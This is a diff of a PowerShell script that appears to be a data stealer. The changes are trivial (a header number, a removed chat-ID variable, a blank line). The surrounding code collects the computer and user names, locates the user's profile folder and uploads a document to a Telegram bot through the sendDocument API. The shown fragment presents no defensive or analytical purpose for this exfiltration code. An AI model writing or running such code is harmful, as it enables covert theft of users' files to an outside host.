@@ -1,4 +1,4 @@
-#3
+#7
 
 $ComputerName = $env:COMPUTERNAME
 $UserName = $env:USERNAME
@@ -26,7 +26,6 @@ $msg = "A executar script em $ComputerName - $UserName"
 
 
 $botToken = "$token"
-$chatId   = "$chatId"
 
 $diretorio = [Environment]::GetFolderPath("UserProfile")
 
@@ -58,6 +57,7 @@ Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendDocument" `
                   -Body $body
 
 exit
+
 
 
 
